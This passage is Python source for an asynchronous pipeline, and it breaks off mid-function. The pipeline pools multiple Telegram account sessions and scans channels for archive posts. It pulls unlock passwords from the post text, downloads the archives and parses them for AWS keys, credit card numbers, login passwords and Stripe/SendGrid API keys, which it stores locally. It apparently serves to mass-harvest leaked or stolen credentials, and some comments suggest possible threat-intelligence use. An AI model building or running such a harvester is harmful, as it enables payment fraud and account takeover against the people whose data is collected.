from __future__ import annotations

import asyncio
import hashlib
import logging
import os
import shutil
import signal
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import urlparse
import uvicorn
from telethon import TelegramClient, events
from telethon.errors import AuthKeyDuplicatedError, FloodWaitError
from telethon.sessions import StringSession
from telethon.tl.types import PeerChannel
from config import Settings, load_settings
from database_manager import DatabaseManager, Job
from extractor import ArchiveProcessor
from parse_credentials import scan_tree, write_results, extract_raw_credentials
from parse_credit_cards import extract_credit_cards, write_credit_cards_file
from parse_passwords import extract_passwords, write_passwords_file
from parse_api_keys import extract_api_keys, write_api_keys_file
from parse_archive_passwords import extract_archive_passwords_from_messages
from password_store import PasswordStore
from session_store import SessionStore
from secure_logging import configure_logging
from webapp import Dashboard

LOG=logging.getLogger('pipeline')

@dataclass(frozen=True,slots=True)
class QueueItem: job_id:int

@dataclass(slots=True)
class LiveSession:
    id: str
    label: str
    session_string: str
    client: TelegramClient
    online: bool = False
    user_id: int | None = None
    username: str | None = None
    first_name: str | None = None
    phone: str | None = None
    active_jobs: int = 0
    last_error: str | None = None

class Pipeline:
    def __init__(self,s:Settings):
        self.s=s
        self.db=DatabaseManager(s.database_path,s.inbox_dir,s.work_dir,s.output_dir)
        self.queue:asyncio.Queue[QueueItem]=asyncio.Queue(maxsize=100)
        self._lock_file=None
        self._acquire_session_lock()
        self.session_store=SessionStore(s.session_store_path,s.password_encryption_key)
        # Seed pool from env/legacy single-session sources on first boot.
        bootstrap=self._load_session_string()
        self.session_store.seed_if_empty(bootstrap, label='Primary')
        self.sessions:dict[str,LiveSession]={}
        self.client:TelegramClient|None=None  # primary (first online) client
        self.passwords=PasswordStore(s.password_store_path,s.password_encryption_key)
        self.extractor=ArchiveProcessor(s,self.passwords.list_plain)
        workers=max(1, min(24, self.db.get_extraction_workers(s.extraction_workers)))
        self.semaphore=asyncio.Semaphore(workers)
        self.ingest_workers=max(1, min(16, s.ingest_workers))
        self._stop_requested=asyncio.Event()
        self._shutdown=asyncio.Event()
        self._ingest_tasks:dict[int,asyncio.Task]={}
        self._ingest_supervisor_task:asyncio.Task|None=None
        self._active_tasks:set[asyncio.Task]=set()
        self._stop_generation=0
        self._ingest_worker_heartbeat=0.0
        self._session_rr=0

    def set_extraction_workers(self, workers: int) -> None:
        workers = max(1, min(24, int(workers)))
        self.semaphore = asyncio.Semaphore(workers)
        LOG.info('Extraction semaphore updated', extra={'workers': workers, 'stage': 'config'})

    def _acquire_session_lock(self,timeout_seconds:float=30.0)->None:
        """Acquire an exclusive OS-level lock on the session lock file so that
        two containers (e.g. the old and new one during a deploy) can never
        share the same Telegram session at once."""
        self.s.session_lock_path.parent.mkdir(parents=True,exist_ok=True,mode=0o700)
        self._lock_file=open(self.s.session_lock_path,'a+')
        deadline=time.monotonic()+timeout_seconds
        while True:
            try:
                if os.name=='nt':
                    import msvcrt
                    msvcrt.locking(self._lock_file.fileno(),msvcrt.LK_NBLCK,1)
                else:
                    import fcntl
                    fcntl.flock(self._lock_file.fileno(),fcntl.LOCK_EX|fcntl.LOCK_NB)
                LOG.info('Session lock acquired',extra={'stage':'startup'})
                return
            except OSError:
                if time.monotonic()>=deadline:
                    LOG.error('Could not acquire session lock after %.0fs; another instance is likely still running',timeout_seconds,extra={'stage':'startup'})
                    self._lock_file.close(); sys.exit(1)
                time.sleep(1)

    def _release_session_lock(self)->None:
        if not self._lock_file: return
        try:
            if os.name=='nt':
                import msvcrt
                try: msvcrt.locking(self._lock_file.fileno(),msvcrt.LK_UNLCK,1)
                except OSError: pass
            else:
                import fcntl
                fcntl.flock(self._lock_file.fileno(),fcntl.LOCK_UN)
        finally:
            self._lock_file.close(); self._lock_file=None

    def _load_session_string(self)->str:
        path=self.s.session_file_path
        if path.exists():
            content=path.read_text(encoding='utf-8').strip()
            if content: return content
        stored=self.db.get_config('TELEGRAM_STRING_SESSION')
        if isinstance(stored, str) and stored.strip():
            return stored.strip()
        return self.s.string_session

    def _persist_session_string(self, session_string: str | None = None)->None:
        try:
            if session_string is None:
                if self.client is None:
                    return
                session_string=self.client.session.save()
            self.s.session_file_path.parent.mkdir(parents=True,exist_ok=True,mode=0o700)
            self.s.session_file_path.write_text(session_string,encoding='utf-8')
            self.db.store_config('TELEGRAM_STRING_SESSION', session_string)
        except Exception:
            LOG.exception('Failed to persist Telegram session file',extra={'stage':'startup'})

    def session_status(self) -> list[dict]:
        """Dashboard-safe live status for all Telegram accounts."""
        rows = []
        for item in self.session_store.public_list():
            live = self.sessions.get(str(item['id']))
            display = item.get('first_name') or item.get('username') or item.get('label') or 'Account'
            if item.get('username') and item.get('first_name'):
                display = f"{item['first_name']} (@{item['username']})"
            elif item.get('username'):
                display = f"@{item['username']}"
            rows.append({
                **item,
                'online': bool(live and live.online),
                'active_jobs': int(live.active_jobs) if live else 0,
                'last_error': live.last_error if live else None,
                'display_name': display,
            })
        return rows

    def _pick_session(self) -> LiveSession | None:
        """Pick an online session that still has per-account download capacity."""
        online = [
            s for s in self.sessions.values()
            if s.online and s.active_jobs < self.ingest_workers
        ]
        if not online:
            return None
        # Prefer least busy; round-robin tie-break keeps accounts warm.
        online.sort(key=lambda s: (s.active_jobs, s.id))
        self._session_rr = (self._session_rr + 1) % len(online)
        chosen = online[self._session_rr % len(online)]
        least = online[0]
        return least if least.active_jobs < chosen.active_jobs else chosen

    def _ingest_capacity(self) -> int:
        """Total parallel downloads = INGEST_WORKERS × online sessions."""
        online = sum(1 for s in self.sessions.values() if s.online)
        return self.ingest_workers * max(0, online)

    def _set_primary_client(self) -> None:
        for session in self.sessions.values():
            if session.online:
                self.client = session.client
                return
        # Fall back to any connected client object if present.
        for session in self.sessions.values():
            self.client = session.client
            return

    async def _connect_session(self, record: dict) -> LiveSession:
        session_id = str(record['id'])
        client = TelegramClient(
            StringSession(record['session_string']),
            self.s.api_id,
            self.s.api_hash,
        )
        live = LiveSession(
            id=session_id,
            label=str(record.get('label') or 'Account'),
            session_string=str(record['session_string']),
            client=client,
            user_id=record.get('user_id'),
            username=record.get('username'),
            first_name=record.get('first_name'),
            phone=record.get('phone'),
        )
        try:
            await client.connect()
            if not await client.is_user_authorized():
                live.online = False
                live.last_error = 'Session is not authorized'
                await client.disconnect()
                return live
            me = await client.get_me()
            live.online = True
            live.user_id = int(me.id)
            live.username = me.username
            live.first_name = me.first_name
            live.phone = me.phone
            live.last_error = None
            await asyncio.to_thread(
                self.session_store.update_profile,
                session_id,
                user_id=live.user_id,
                username=live.username,
                first_name=live.first_name,
                phone=live.phone,
            )
            LOG.info(
                'Telegram session online: %s (%s)',
                live.first_name or live.label,
                f'@{live.username}' if live.username else live.user_id,
                extra={'stage': 'session', 'session_id': session_id},
            )
        except AuthKeyDuplicatedError:
            live.online = False
            live.last_error = 'Session revoked (used elsewhere)'
            LOG.error('Session %s revoked due to duplicate use', session_id, extra={'stage': 'session'})
            try:
                await client.disconnect()
            except Exception:
                pass
        except Exception as exc:
            live.online = False
            live.last_error = f'{type(exc).__name__}: {exc}'
            LOG.exception('Failed to connect session %s', session_id, extra={'stage': 'session'})
            try:
                await client.disconnect()
            except Exception:
                pass
        return live

    async def start_sessions(self) -> None:
        records = self.session_store.list_raw()
        if not records:
            raise RuntimeError('No Telegram sessions configured')
        connected: dict[str, LiveSession] = {}
        for record in records:
            if not record.get('enabled', True):
                continue
            live = await self._connect_session(record)
            connected[live.id] = live
        self.sessions = connected
        self._set_primary_client()
        online = sum(1 for s in self.sessions.values() if s.online)
        if online == 0:
            raise RuntimeError('No Telegram sessions could come online')
        LOG.info('Telegram session pool ready: %s online / %s total', online, len(self.sessions), extra={'stage': 'startup'})

    async def add_session(self, session_string: str, label: str = '') -> dict:
        """Validate, store, and hot-connect a new account session."""
        client = TelegramClient(StringSession(session_string.strip()), self.s.api_id, self.s.api_hash)
        try:
            await client.connect()
            if not await client.is_user_authorized():
                raise ValueError('Session string is not authorized')
            me = await client.get_me()
            entry = await asyncio.to_thread(
                self.session_store.add,
                session_string,
                label,
                user_id=int(me.id),
                username=me.username,
                first_name=me.first_name,
                phone=me.phone,
            )
        finally:
            try:
                await client.disconnect()
            except Exception:
                pass
        live = await self._connect_session(entry)
        self.sessions[live.id] = live
        self._set_primary_client()
        # Keep legacy single-session file in sync with the newest online account.
        if live.online:
            self._persist_session_string(live.session_string)
        self.kick_ingest()
        return {
            'id': live.id,
            'online': live.online,
            'display_name': live.first_name or live.username or live.label,
            'username': live.username,
            'first_name': live.first_name,
            'user_id': live.user_id,
            'last_error': live.last_error,
        }

    async def remove_session(self, session_id: str) -> None:
        online_ids = [sid for sid, s in self.sessions.items() if s.online]
        if len(online_ids) <= 1 and session_id in online_ids:
            raise ValueError('Cannot remove the last online Telegram session')
        live = self.sessions.get(session_id)
        if live and live.active_jobs > 0:
            raise ValueError('Session is busy with active downloads; stop jobs first')
        await asyncio.to_thread(self.session_store.delete, session_id)
        if live:
            try:
                await live.client.disconnect()
            except Exception:
                pass
            self.sessions.pop(session_id, None)
        self._set_primary_client()
        self.kick_ingest()

    async def refresh_session_statuses(self) -> list[dict]:
        for live in list(self.sessions.values()):
            try:
                if not live.client.is_connected():
                    await live.client.connect()
                authorized = await live.client.is_user_authorized()
                live.online = bool(authorized)
                if authorized and not live.user_id:
                    me = await live.client.get_me()
                    live.user_id = int(me.id)
                    live.username = me.username
                    live.first_name = me.first_name
                    live.phone = me.phone
                if authorized:
                    live.last_error = None
            except Exception as exc:
                live.online = False
                live.last_error = f'{type(exc).__name__}: {exc}'
        self._set_primary_client()
        return self.session_status()

    @staticmethod
    def validate_channel_link(url:str)->tuple[str,int]:
        parsed=urlparse(url.strip())
        if parsed.scheme!='https' or parsed.hostname not in {'t.me','www.t.me','telegram.me','www.telegram.me'}:
            raise ValueError('Use an https://t.me message link')
        parts=[p for p in parsed.path.split('/') if p]
        if len(parts)<2 or not parts[-1].isdigit(): raise ValueError('Link must point to a specific Telegram message')
        if parts[0] in {'joinchat','+'}: raise ValueError('Invite links are not supported')
        if parts[0]=='c':
            if len(parts)!=3 or not parts[1].isdigit(): raise ValueError('Invalid private channel message link')
            return f'c:{parts[1]}',int(parts[2])
        if not parts[0].replace('_','').isalnum(): raise ValueError('Invalid public channel username')
        return parts[0],int(parts[-1])

    @staticmethod
    def web_job_id(url:str)->int:
        digest=hashlib.blake2b(f'{url}:{time.time_ns()}'.encode(),digest_size=8).digest()
        return int.from_bytes(digest,'big') & ((1<<63)-1)

    async def notify(self,chat_id:int,text:str,reply_to:int|None=None):
        if not chat_id or self.client is None: return None
        try: return await self.client.send_message(chat_id,text,reply_to=reply_to)
        except Exception: LOG.exception('Progress notification failed',extra={'message_id':reply_to,'stage':'notification'}); return None

    async def notify_cred_bot(self, text: str, document: Path | None = None) -> bool:
        """Never send extracted secrets to Telegram. Dashboard/DB only."""
        LOG.info(
            'Skipping Telegram credential-bot delivery',
            extra={'stage': 'cred-alert', 'has_document': bool(document and document.is_file())},
        )
        return False

    async def alert_credentials(self, job: Job, raw_creds: list[dict]) -> None:
        """Persist found AWS credentials locally. Do not send them to Telegram."""
        if not raw_creds:
            return
        await asyncio.to_thread(self.db.save_credentials, job.id, raw_creds)
        creds_file = self.s.output_dir / f'credentials-{job.message_id}.txt'
        creds_lines = [f"{c['access_key']}:{c['secret_key']}:{c['region']}" for c in raw_creds]
        await asyncio.to_thread(
            lambda: (creds_file.write_text('\n'.join(creds_lines) + '\n', encoding='utf-8'), creds_file.chmod(0o600))
        )
        unique_files = len({c['file'] for c in raw_creds})
        LOG.info(
            'Credentials extracted (Telegram delivery disabled)',
            extra={
                'job_id': job.id,
                'message_id': job.message_id,
                'creds_count': len(raw_creds),
                'files_with_creds': unique_files,
                'stage': 'cred-alert',
            },
        )

    async def alert_credit_cards(self, job: Job, cards: list[dict]) -> None:
        """Persist found credit cards locally. Do not send them to Telegram."""
        if not cards:
            return
        await asyncio.to_thread(self.db.save_credit_cards, job.id, cards)
        cards_file = self.s.output_dir / f'credit-cards-{job.message_id}.txt'
        await asyncio.to_thread(write_credit_cards_file, cards, cards_file)
        unique_files = len({c['file'] for c in cards})
        LOG.info(
            'Credit cards extracted (Telegram delivery disabled)',
            extra={
                'job_id': job.id,
                'message_id': job.message_id,
                'cards_count': len(cards),
                'files_with_cards': unique_files,
                'stage': 'credit-card-alert',
            },
        )

    async def alert_passwords(self, job: Job, records: list[dict]) -> None:
        """Persist found login passwords locally. Do not send them to Telegram."""
        if not records:
            return
        await asyncio.to_thread(self.db.save_passwords, job.id, records)
        passwords_file = self.s.output_dir / f'passwords-{job.message_id}.txt'
        await asyncio.to_thread(write_passwords_file, records, passwords_file)
        unique_files = len({r['file'] for r in records})
        LOG.info(
            'Passwords extracted (Telegram delivery disabled)',
            extra={
                'job_id': job.id,
                'message_id': job.message_id,
                'passwords_count': len(records),
                'files_with_passwords': unique_files,
                'stage': 'password-alert',
            },
        )

    async def alert_api_keys(self, job: Job, keys: list[dict]) -> None:
        """Persist found SendGrid/Stripe keys locally. Do not send them to Telegram."""
        if not keys:
            return
        await asyncio.to_thread(self.db.save_api_keys, job.id, keys)
        keys_file = self.s.output_dir / f'api-keys-{job.message_id}.txt'
        await asyncio.to_thread(write_api_keys_file, keys, keys_file)
        unique_files = len({k['file'] for k in keys})
        LOG.info(
            'API keys extracted (Telegram delivery disabled)',
            extra={
                'job_id': job.id,
                'message_id': job.message_id,
                'keys_count': len(keys),
                'files_with_keys': unique_files,
                'stage': 'api-key-alert',
            },
        )

    @staticmethod
    def _bar(fraction:float,width:int=16)->str:
        fraction=0.0 if fraction<0 else 1.0 if fraction>1 else fraction
        filled=int(fraction*width)
        return '█'*filled+'░'*(width-filled)

    @staticmethod
    def _human(n:float)->str:
        for unit in ('B','KB','MB','GB'):
            if n<1024 or unit=='GB': return f'{n:.1f} {unit}'
            n/=1024
        return f'{n:.1f} GB'

    def _make_progress_callback(self,progress_message,job_id:int,index:int,file_count:int,filename:str):
        """Telethon progress_callback: writes progress to the DB (for web polling)
        and edits one Telegram message in place (for chat). Both are throttled."""
        state={'last_edit':0.0,'last_db':0.0,'last_pct':-1}
        def callback(received:int,total:int):
            now=time.monotonic()
            pct=int(received*100/total) if total else 0
            final=received>=total>0
            # DB write: at most ~every 1s (the web poller reads this).
            if now-state['last_db']>=1.0 or final:
                state['last_db']=now
                asyncio.create_task(asyncio.to_thread(
                    self.db.update_progress,job_id,'downloading',received,total,filename,index,file_count))
            # Telegram edit: only if we sent a chat message, throttled ~2s.
            if progress_message is not None and (pct!=state['last_pct'] and (now-state['last_edit']>=2.0 or final)):
                state['last_edit']=now; state['last_pct']=pct
                fraction=received/total if total else 0.0
                text=(f'📥 Downloading file {index}/{file_count}: {filename}\n'
                      f'{self._bar(fraction)} {pct}%\n'
                      f'{self._human(received)} / {self._human(total)}')
                asyncio.create_task(self._safe_edit(progress_message,text))
        return callback

    async def _safe_edit(self,message,text:str):
        try: await message.edit(text)
        except Exception: pass  # Ignore 'message not modified', flood-wait, etc.

    def harvest_archive_passwords(self, messages: list, inbox: Path | None = None) -> list[str]:
        """Take archive unlock passwords from Telegram post text and store them."""
        harvested = extract_archive_passwords_from_messages(messages)
        if not harvested:
            return []
        try:
            self.passwords.add_values(harvested)
        except ValueError:
            pass
        if inbox is not None:
            inbox.mkdir(parents=True, exist_ok=True, mode=0o700)
            path = inbox / "passwords.txt"
            existing: list[str] = []
            if path.is_file():
                existing = [line.strip() for line in path.read_text(encoding="utf-8", errors="replace").splitlines() if line.strip()]
            merged = existing[:]
            seen = set(existing)
            for password in harvested:
                if password not in seen:
                    merged.append(password)
                    seen.add(password)
            path.write_text("\n".join(merged) + ("\n" if merged else ""), encoding="utf-8")
            path.chmod(0o600)
        LOG.info(
            "Harvested %s archive password(s) from post description",
            len(harvested),
            extra={"stage": "archive-passwords", "passwords_found": len(harvested)},
        )
        return harvested

    async def queue_messages(self,*,messages:list,job_key:int,chat_id:int,user_id:int,source:str,source_link:str|None=None,notify:bool=True,existing_job_id:int|None=None):
        inbox=self.s.inbox_dir/str(job_key); inbox.mkdir(parents=True,exist_ok=True,mode=0o700)
        await asyncio.to_thread(self.harvest_archive_passwords, messages, inbox)
        media_messages=[m for m in messages if m.media]
        file_count=len(media_messages)
        progress=None
        if notify:
            progress=await self.notify(chat_id,f'📥 Authorized upload received. Downloading {file_count} file(s)…',messages[0].id if messages else None)
        # Create the job row up front (empty files, still 'pending') so the web
        # dashboard has something to poll while the download is running.
        if existing_job_id is not None:
            job_id=existing_job_id
            current=await asyncio.to_thread(self.db.get_job,job_id)
            if not current or current.status not in {'pending','running'}:
                raise ValueError('Stopped by operator')
        else:
            job_id=await asyncio.to_thread(self.db.create_job,job_key,chat_id,user_id,[],source,source_link)
        files=[]; total=0; skipped_duplicates=0
        stop_gen=self._stop_generation
        try:
            if self._stop_requested.is_set() or stop_gen != self._stop_generation:
                raise ValueError('Stopped by operator')
            available = shutil.disk_usage(self.s.inbox_dir).free
            if available <= self.s.min_free_bytes:
                raise ValueError('Insufficient disk space before download')
            for index,message in enumerate(media_messages,1):
                if self._stop_requested.is_set() or stop_gen != self._stop_generation:
                    raise ValueError('Stopped by operator')
                live=await asyncio.to_thread(self.db.get_job,job_id)
                if not live or live.status not in {'pending','running'}:
                    raise ValueError('Stopped by operator')
                filename=Path(getattr(message.file,'name',None) or f'upload-{index}.bin').name
                lowered = filename.strip().lower()
                if any(Path(path).name.strip().lower() == lowered for path in files):
                    skipped_duplicates += 1
                    LOG.info(
                        'Skipping duplicate Telegram archive %s within the same job',
                        filename,
                        extra={'job_id': job_id, 'message_id': job_key, 'stage': 'download'},
                    )
                    continue
                duplicate_of = await asyncio.to_thread(self.db.find_job_id_by_input_basename, filename, job_id)
                if duplicate_of is not None:
                    skipped_duplicates += 1
                    LOG.info(
                        'Skipping duplicate Telegram archive %s (already on job %s)',
                        filename, duplicate_of,
                        extra={'job_id': job_id, 'message_id': job_key, 'stage': 'download'},
                    )
                    continue
                destination=inbox/filename
                if destination.exists(): destination=inbox/f'{index}-{filename}'
                # MAX_DOWNLOAD_BYTES is advisory only (0 = ignore). Free disk is the hard stop.
                # Do not fail jobs for large Telegram archives that exceed an old 2GiB env value.
                reported = getattr(getattr(message, 'file', None), 'size', None)
                if self.s.max_download_bytes > 0 and isinstance(reported, int) and reported > self.s.max_download_bytes:
                    LOG.warning(
                        'File %s reported size %s exceeds MAX_DOWNLOAD_BYTES=%s; continuing download',
                        filename, reported, self.s.max_download_bytes,
                        extra={'job_id': job_id, 'message_id': job_key, 'stage': 'download'},
                    )
                # Seed total from Telegram size when known so the UI bar appears immediately.
                seed_total = int(reported) if isinstance(reported, int) and reported > 0 else 0
                await asyncio.to_thread(self.db.update_progress,job_id,'downloading',0,seed_total,filename,index,file_count)
                await message.download_media(
                    file=str(destination),
                    progress_callback=self._make_progress_callback(progress,job_id,index,file_count,filename),
                )
                if self._stop_requested.is_set() or stop_gen != self._stop_generation:
                    raise ValueError('Stopped by operator')
                size=destination.stat().st_size
                total+=size
                if self.s.max_download_bytes > 0 and size > self.s.max_download_bytes:
                    LOG.warning(
                        'File %s size %s exceeds MAX_DOWNLOAD_BYTES=%s; continuing',
                        filename, size, self.s.max_download_bytes,
                        extra={'job_id': job_id, 'message_id': job_key, 'stage': 'download'},
                    )
                available = shutil.disk_usage(self.s.inbox_dir).free
                if available <= self.s.min_free_bytes:
                    raise ValueError('Insufficient disk space')
                files.append(str(destination))
            if not files:
                if skipped_duplicates:
                    await asyncio.to_thread(self.db.delete_job, job_id)
                    shutil.rmtree(inbox, ignore_errors=True)
                    if notify:
                        await self.notify(
                            chat_id,
                            '♻️ Duplicate archive skipped (same filename already queued).',
                            messages[0].id if messages else None,
                        )
                    LOG.info(
                        'Duplicate archive job removed (no unique media)',
                        extra={'job_id': job_id, 'message_id': job_key, 'stage': 'download'},
                    )
                    return None
                raise ValueError('Telegram message has no downloadable media')
            live=await asyncio.to_thread(self.db.get_job,job_id)
            if not live or live.status not in {'pending','running'}:
                raise ValueError('Stopped by operator')
            # Fill in the downloaded files without resurrecting a stopped/failed row.
            await asyncio.to_thread(self.db.set_job_files_if_active,job_id,files)
            await asyncio.to_thread(self.db.clear_progress,job_id)
            await self.queue.put(QueueItem(job_id))
            if notify: await self.notify(chat_id,f'✅ Downloaded {len(files)} file(s); queued.',messages[0].id)
            LOG.info(
                'Download finished and queued for extraction (%s file(s), %s)',
                len(files), self._human(total),
                extra={'job_id': job_id, 'message_id': job_key, 'stage': 'download'},
            )
            return job_id
        except asyncio.CancelledError:
            await asyncio.to_thread(self.db.mark_failed,job_id,'Stopped by operator')
            await asyncio.to_thread(self.db.clear_progress,job_id)
            shutil.rmtree(inbox,ignore_errors=True)
            raise
        except Exception as exc:
            # Always fail the DB row — otherwise empty pending jobs sit forever
            # (ingest only claims channel-link rows; extract only runs after queue.put).
            await asyncio.to_thread(
                self.db.mark_failed, job_id, f'{type(exc).__name__}: {exc}'
            )
            await asyncio.to_thread(self.db.clear_progress, job_id)
            shutil.rmtree(inbox, ignore_errors=True)
            raise

    async def enqueue_channel_link(self, url: str) -> int | None:
        """Create a visible pending job and schedule download.

        Skips when the same source_link is already pending, running, or completed
        so range/scan submits cannot multiply one Telegram post into many jobs.
        """
        url = (url or '').strip()
        existing = await asyncio.to_thread(
            self.db.find_channel_link_job, url, statuses=('pending', 'running', 'completed')
        )
        if existing is not None:
            LOG.info(
                'Skipping duplicate channel link (already job %s)',
                existing,
                extra={'job_id': existing, 'stage': 'web-ingest'},
            )
            return None
        job_key = self.web_job_id(url)
        job_id = await asyncio.to_thread(self.db.create_job, job_key, 0, 0, [], 'channel-link', url)
        await asyncio.to_thread(self.db.update_progress, job_id, 'queued', 0, 0, 'waiting', 0, 0)
        self.kick_ingest()
        LOG.info('Channel link enqueued', extra={'job_id': job_id, 'message_id': job_key, 'stage': 'web-ingest'})
        return job_id

    async def scan_channel_media(
        self,
        channel: str,
        *,
        start_id: int | None = None,
        end_id: int | None = None,
        enqueue: bool = True,
        limit: int = 2000,
    ) -> dict:
        """Find messages with media in a channel range and optionally queue them.

        Skips IDs already completed or already pending/running. Albums are
        de-duplicated to one queue item (the lowest message id in the group).
        """
        username = (channel or '').strip().lstrip('@')
        if not username or not username.replace('_', '').isalnum():
            raise ValueError('Channel must be a public Telegram username')
        if limit < 1 or limit > 5000:
            raise ValueError('limit must be between 1 and 5000')

        client = None
        for live in self.sessions.values():
            if live.online and live.client is not None:
                client = live.client
                break
        if client is None:
            client = self.client
        if client is None:
            raise RuntimeError('No online Telegram session available')

        entity = await client.get_entity(username)
        latest_batch = await client.get_messages(entity, limit=1)
        latest_id = int(latest_batch[0].id) if latest_batch else 0
        if latest_id <= 0:
            raise ValueError(f'Channel @{username} has no messages')

        hi = min(end_id if end_id is not None else latest_id, latest_id)
        lo = start_id if start_id is not None else max(1, hi - limit + 1)
        if lo < 1:
            lo = 1
        if hi < lo:
            raise ValueError('start_id must be <= end_id')
        if hi - lo + 1 > 5000:
            raise ValueError('Scan range too large (max 5000)')

        done_ids = await asyncio.to_thread(self.db.completed_channel_message_ids, username)
        pending_ids = await asyncio.to_thread(self.db.pending_channel_message_ids, username)
        skip_ids = done_ids | pending_ids

        found: list[dict] = []
        seen_albums: set[int] = set()
        # Probe in chunks — deleted IDs come back as None.
        chunk = 80
        for offset in range(lo, hi + 1, chunk):
            ids = list(range(offset, min(offset + chunk, hi + 1)))
            messages = await client.get_messages(entity, ids=ids)
            if not isinstance(messages, list):
                messages = [messages]
            for msg in messages:
                if not msg:
                    continue
                if getattr(msg, 'raw_text', None) or getattr(msg, 'message', None):
                    await asyncio.to_thread(self.harvest_archive_passwords, [msg], None)
                if not getattr(msg, 'media', None):
                    continue
                mid = int(msg.id)
                if mid in skip_ids:
                    continue
                grouped = getattr(msg, 'grouped_id', None)
                if grouped is not None:
                    gid = int(grouped)
                    if gid in seen_albums:
                        continue
                    seen_albums.add(gid)
                found.append({
                    'message_id': mid,
                    'url': f'https://t.me/{username}/{mid}',
                    'grouped_id': int(grouped) if grouped is not None else None,
                })
            await asyncio.sleep(0.15)

        found.sort(key=lambda item: item['message_id'])
        queued = 0
        skipped = 0
        if enqueue:
            for item in found:
                job_id = await self.enqueue_channel_link(item['url'])
                if job_id is None:
                    skipped += 1
                else:
                    queued += 1

        result = {
            'channel': username,
            'latest_id': latest_id,
            'start_id': lo,
            'end_id': hi,
            'found': len(found),
            'queued': queued,
            'skipped': skipped,
            'skipped_completed': len(done_ids),
            'urls': [item['url'] for item in found],
        }
        LOG.info(
            'Channel media scan finished',
            extra={
                'stage': 'channel-scan',
                'channel': username,
                'found': len(found),
                'queued': queued,
                'start_id': lo,
                'end_id': hi,
                'latest_id': latest_id,
            },
        )
        return result

    def kick_ingest(self) -> None:
        """Reconcile DB pending rows with tracked per-job download tasks."""
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            return
        if self._ingest_supervisor_task is not None and not self._ingest_supervisor_task.done():
            return
        self._ingest_supervisor_task = loop.create_task(
            self._schedule_pending_ingests(), name='ingest-supervisor'
        )

    async def _schedule_pending_ingests(self) -> None:
        """Start pending downloads: up to INGEST_WORKERS parallel per online session."""
        self._ingest_worker_heartbeat = time.monotonic()
        for job_id, task in list(self._ingest_tasks.items()):
            if task.done():
                self._ingest_tasks.pop(job_id, None)
        capacity = self._ingest_capacity()
        available = capacity - len(self._ingest_tasks)
        if available <= 0 or capacity <= 0:
            return
        pending = await asyncio.to_thread(self.db.pending_channel_downloads)
        pending = [item for item in pending if item['job_id'] not in self._ingest_tasks]
        if not pending:
            return
        started_count = 0
        for item in pending:
            if started_count >= available:
                break
            session = self._pick_session()
            if session is None:
                break
            claimed = await asyncio.to_thread(
                self.db.mark_fetching_if_pending, item['job_id']
            )
            if not claimed:
                continue
            # Reserve the per-session slot immediately so the next pick spreads out.
            session.active_jobs += 1
            task = asyncio.create_task(
                self._run_ingest_job(item['job_id'], item['job_key'], item['url'], session.id),
                name=f"ingest-job-{item['job_id']}",
            )
            self._ingest_tasks[item['job_id']] = task
            started_count += 1
            task.add_done_callback(
                lambda completed, jid=item['job_id']: self._ingest_done(jid, completed)
            )
        LOG.info(
            'Ingest supervisor started %s job(s): active=%s/%s (per_session=%s) queued=%s sessions_online=%s',
            started_count, len(self._ingest_tasks), capacity, self.ingest_workers,
            max(0, len(pending) - started_count),
            sum(1 for s in self.sessions.values() if s.online),
            extra={'stage': 'web-ingest'},
        )

    def _ingest_done(self, job_id:int, completed:asyncio.Task) -> None:
        if self._ingest_tasks.get(job_id) is completed:
            self._ingest_tasks.pop(job_id, None)
        if completed.cancelled():
            LOG.info('Ingest job cancelled', extra={'job_id': job_id, 'stage': 'web-ingest'})
        else:
            exc = completed.exception()
            if exc is not None:
                LOG.error(
                    'Ingest task crashed: %s', exc,
                    extra={'job_id': job_id, 'stage': 'web-ingest'},
                )
        self.kick_ingest()

    async def _run_ingest_job(self, job_id:int, job_key:int, url:str, session_id:str) -> None:
        """Fetch and download one job on a specific Telegram account."""
        if self._stop_requested.is_set():
            return
        live = self.sessions.get(session_id)
        if live is None or not live.online:
            # Session disappeared; leave job pending for another account.
            if live is not None:
                live.active_jobs = max(0, live.active_jobs - 1)
            await asyncio.to_thread(
                self.db.update_progress, job_id, 'queued', 0, 0, 'waiting', 0, 0
            )
            return
        try:
            current = await asyncio.to_thread(self.db.get_job, job_id)
            if not current or current.status not in {'pending','running'} or current.input_files:
                return
            LOG.info(
                'Parallel ingest job started on %s',
                live.first_name or live.label,
                extra={'job_id': job_id, 'message_id': job_key, 'stage': 'web-ingest', 'session_id': session_id},
            )
            await self.ingest_channel_link(
                url, job_id, job_key, client=live.client, session_id=session_id
            )
            await asyncio.sleep(0.75)
        finally:
            live.active_jobs = max(0, live.active_jobs - 1)

    async def _resolve_channel_message(self, client: TelegramClient, url: str):
        """Resolve a t.me message link to (entity, message, messages_for_album)."""
        target, message_id = self.validate_channel_link(url)
        if target.startswith('c:'):
            entity = await client.get_entity(PeerChannel(int(target[2:])))
        else:
            entity = await client.get_entity(target)
        message = await client.get_messages(entity, ids=message_id)
        if not message:
            latest = await client.get_messages(entity, limit=1)
            latest_id = int(latest[0].id) if latest else None
            if latest_id is not None and message_id > latest_id:
                raise ValueError(
                    f'Message {message_id} does not exist in this channel '
                    f'(latest message is {latest_id})'
                )
            raise ValueError(
                f'Message {message_id} was deleted or is not visible'
                + (f' (channel latest is {latest_id})' if latest_id is not None else '')
            )
        messages = [message]
        if message.grouped_id:
            nearby = await client.get_messages(entity, limit=100, offset_id=message_id + 50)
            messages = sorted(
                {
                    m.id: m
                    for m in [message, *nearby]
                    if m and m.grouped_id == message.grouped_id
                }.values(),
                key=lambda m: m.id,
            )
        return entity, message, messages

    @staticmethod
    def _is_session_access_error(exc: BaseException) -> bool:
        text = f'{type(exc).__name__}: {exc}'.lower()
        tokens = (
            'channelprivate',
            'channel invalid',
            'username invalid',
            'username not occupied',
            'chatadminrequired',
            'unavailable',
            'not visible',
            'does not exist in this channel',
            'was deleted',
        )
        return any(token in text for token in tokens)

    async def ingest_channel_link(
        self,
        url: str,
        job_id: int | None = None,
        job_key: int | None = None,
        client: TelegramClient | None = None,
        session_id: str | None = None,
    ):
        job_key = job_key if job_key is not None else self.web_job_id(url)
        preferred = client or self.client
        if preferred is None and not any(s.online for s in self.sessions.values()):
            raise RuntimeError('No Telegram client available')
        if job_id is None:
            job_id = await asyncio.to_thread(self.db.create_job, job_key, 0, 0, [], 'channel-link', url)
            await asyncio.to_thread(self.db.update_progress, job_id, 'fetching', 0, 0, 'resolving message', 0, 0)
        try:
            current = await asyncio.to_thread(self.db.get_job, job_id)
